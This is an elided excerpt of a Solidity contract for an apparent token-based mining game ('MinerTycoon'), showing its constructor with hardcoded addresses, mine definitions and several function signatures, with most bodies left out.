...
contract MinerTycoon is Ownable {
    ...
    constructor () {
        ...
        ETH20 = ERC20(0x6816cFDe1153506C469e4f5d05f289362b32fdd4);

        withDrawAddress = 0xE10A7810f559b9A877B8E29E64201151B4d4f83c;

        depositAddress = 0x720588D6Df3e7Fe46E19De44cFD10EC849f9B351;

        contractUsers[msg.sender] = true;

        mines[1] = Mine(1, 1e18, 3e19,  uint256(1e18).div(uint256(90)));

        mines[2] = Mine(2, 1e17, 3e18, uint(1e17).div(90));
    ...
    function buyMine(uint mid, uint8 colors) public payable {
        ...
        require(ETH20.balanceOf(msg.sender) > mines[mid].price, "no much eth can use");
    ...
    function getMineYesterday(uint id) public checkMine(id) {
        ...
        ETH20.transferFrom(depositAddress, msg.sender, much);
    ...
    function transferbalanceEth(address adds, uint amount) public payable {
    ...
    function minesCanCheck(uint minesId) public view checkMine(minesId) returns(bool) {
